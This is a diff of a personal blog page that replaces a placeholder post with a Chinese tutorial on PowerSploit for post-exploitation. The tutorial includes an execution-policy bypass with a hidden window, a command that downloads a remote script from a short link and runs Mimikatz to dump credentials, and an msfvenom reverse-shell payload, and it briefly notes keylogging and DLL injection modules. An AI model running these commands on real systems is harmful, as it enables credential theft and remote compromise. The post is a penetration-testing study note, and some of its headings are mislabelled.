@@ -49,11 +49,11 @@
 <link rel="shortcut icon" href="/images/sitetitle.jpg">
 
 
-<title>hello, world! - 千夜</title>
+<title>powersploit使用小结 - 千夜</title>
 
-<meta name="keywords" content="博客第一篇">
+<meta name="keywords" content="powersploit">
 
-<meta name="description " content="新建博客写的第一篇">
+<meta name="description " content="powershell是cmd的扩充，在渗透中有许多用处，powersploit是一些powershell集合。在此小结一下用powersploit法。">
 </head>
 <body>
 <div id="nav">
@@ -111,11 +111,11 @@
                     <a href="/categories/program" data-name="编程">编程</a>
                 </li>
             
-                <li class="">
+                <li class="active">
                     <a href="/categories/tool" data-name="工具">工具</a>
                 </li>
             
-                <li class="active">
+                <li class="">
                     <a href="/categories/readThink" data-name="读思">读思</a>
                 </li>
             
@@ -167,19 +167,43 @@
                 </a>
                 <p><span class="label">作者</span>
                     <a href="flowray.top" target="_blank">千夜</a>
-                    <span title="最后编辑于2017-09-29">2017-09-29</span>
+                    <span title="最后编辑于2018-02-21">2018-02-21</span>
                 </p>
                 <p>长路漫漫，踏歌而行</p>
             </div>
-            <h2 class="post-title">Hello, World!</h2>
+            <h2 class="post-title">Powersploit使用小结</h2>
             <div class="post-meta">
-                本文总共35个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共1335个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
-            <p>博客一篇……</p>
-<p>博客旨在记录与总结学过的知识，读过的书。</p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>知行合一</p>
+            <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><h2 id="2-PowerShell"><a href="#2-PowerShell" class="headerlink" title="2 PowerShell"></a>2 PowerShell</h2><p>poweshell是cmd.exe的扩充，可以直接使用<code>.net</code>。可以使用<code>Get-Host</code>来查看powershell当前的版本。</p>
+<h3 id="2-1-PowerShell-常用命令"><a href="#2-1-PowerShell-常用命令" class="headerlink" title="2.1 PowerShell 常用命令"></a>2.1 PowerShell 常用命令</h3><ol>
+<li>本地权限绕过执行<br><code>PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1</code></li>
+<li>本地隐藏权限绕过执行脚本<br><code>PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive-NoProfile -WindowStyle Hidden(隐藏窗口) -File xxx.ps1</code></li>
+<li>直接用IEX下载远程的PS1脚本回来权限绕过执行<br><code>powershell &quot;IEX (New-ObjectNet.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -DumpCreds&quot;</code></li>
+</ol>
+<h2 id="3-Powersploit"><a href="#3-Powersploit" class="headerlink" title="3 Powersploit"></a>3 Powersploit</h2><h3 id="3-1-项目简介"><a href="#3-1-项目简介" class="headerlink" title="3.1 项目简介"></a>3.1 项目简介</h3><p>一款基于powershell的后渗透（Post-Exploitation）框架，集成大量渗透相关模块和功能。可以在github下载：<a href="https://github.com/PowerShellMafia/PowerSploit">项目地址</a>。</p>
+<p>下载完成后可以使用python开启服务器，<code>python3 -m http.server 8080</code>。</p>
+<p><img src="http://ozrtrbf6a.bkt.clouddn.com/18-2-21/86879948.jpg" alt=""></p>
+<h3 id="3-2-常用脚本"><a href="#3-2-常用脚本" class="headerlink" title="3.2 常用脚本"></a>3.2 常用脚本</h3><p>记录常用脚本。</p>
+<h4 id="3-2-1-代码执行"><a href="#3-2-1-代码执行" class="headerlink" title="3.2.1 代码执行"></a>3.2.1 代码执行</h4><h5 id="3-2-1-1-Invoke-Shellcode"><a href="#3-2-1-1-Invoke-Shellcode" class="headerlink" title="3.2.1.1 Invoke-Shellcode"></a>3.2.1.1 Invoke-Shellcode</h5><p>Invoke-Shellcode的作用是：将shellcode插入您选择的进程ID或本地PowerShell中。<br>与Metasploit配合可以出其不意。<br>首先生成反弹木马：</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_https lhost=10.10.10.137 lport=7788 -f powershell -o /root/mytool/msf</code></p>
+<p>win7下载：</p>
+<h5 id="3-2-1-1-Invoke-DllInjection"><a href="#3-2-1-1-Invoke-DllInjection" class="headerlink" title="3.2.1.1 Invoke-DllInjection"></a>3.2.1.1 Invoke-DllInjection</h5><p>Invoke-DllInjection的作用是注入dll。</p>
+<h4 id="3-2-2-内网信息侦察"><a href="#3-2-2-内网信息侦察" class="headerlink" title="3.2.2 内网信息侦察"></a>3.2.2 内网信息侦察</h4><h5 id="3-2-2-1-Invoke-Portscan"><a href="#3-2-2-1-Invoke-Portscan" class="headerlink" title="3.2.2.1 Invoke-Portscan"></a>3.2.2.1 Invoke-Portscan</h5><p>Invoke-Portscan的作用是扫描内网信息。</p>
+<h4 id="3-2-3-主机信息侦察"><a href="#3-2-3-主机信息侦察" class="headerlink" title="3.2.3 主机信息侦察"></a>3.2.3 主机信息侦察</h4><h5 id="3-2-3-1-Invoke-Mimikatz"><a href="#3-2-3-1-Invoke-Mimikatz" class="headerlink" title="3.2.3.1 Invoke-Mimikatz"></a>3.2.3.1 Invoke-Mimikatz</h5><p>Invoke-Mimikatz的作用是抓取管理员密码。</p>
+<h5 id="3-2-3-2-Get-Keystrokes"><a href="#3-2-3-2-Get-Keystrokes" class="headerlink" title="3.2.3.2 Get-Keystrokes"></a>3.2.3.2 Get-Keystrokes</h5><p>键盘记录。</p>
+<h5 id="3-2-3-2-Get-Keystrokes-1"><a href="#3-2-3-2-Get-Keystrokes-1" class="headerlink" title="3.2.3.2 Get-Keystrokes"></a>3.2.3.2 Get-Keystrokes</h5><p>Invoke-NinjaCopy的作用是复制文件。</p>
+<h3 id="3-3-查看帮助文档"><a href="#3-3-查看帮助文档" class="headerlink" title="3.3 查看帮助文档"></a>3.3 查看帮助文档</h3><p>首先导入模块：<code>Import-Module .\PowerSploit</code><br>查看帮助<code>Get-Help PowerSploit</code></p>
+<p><img src="http://myqwerimage.oss-cn-beijing.aliyuncs.com/18-2-21/73279778.jpg" alt=""></p>
+<p>更详细的查看每个脚本的帮助文件。</p>
+<p><img src="index_files/2fc2bfac-2dc1-42b3-84b4-25a80653ff77.png" alt=""></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>powershell可以得到意想不到的效果，多加利用。</p>
+<h2 id="End-参考资料"><a href="#End-参考资料" class="headerlink" title="End 参考资料"></a>End 参考资料</h2><p><a href="http://www.freebuf.com/sectool/131275.html">1. 说说Powersploit在内网渗透中的使用</a></p>
+<p><a href="https://www.anquanke.com/post/id/84728">2. 渗透利器之Powershell</a></p>
+<p><a href="http://www.freebuf.com/articles/system/8130.html">3. PowerSploit+Metasploit=Shells</a></p>
+<p><a href="http://www.360doc.com/content/17/0222/19/35182558_631193353.shtml">4. Powershell &amp; Powersploit 入门</a></p>
 
         </div>
         <div class="post-tool">
@@ -190,7 +214,9 @@
         
         <div class="post-tags">标签：
             
-            <a href="/tags/感想/">感想</a>
+            <a href="/tags/内网渗透/">内网渗透</a>
+            
+            <a href="/tags/工具/">工具</a>
             
         </div>
         
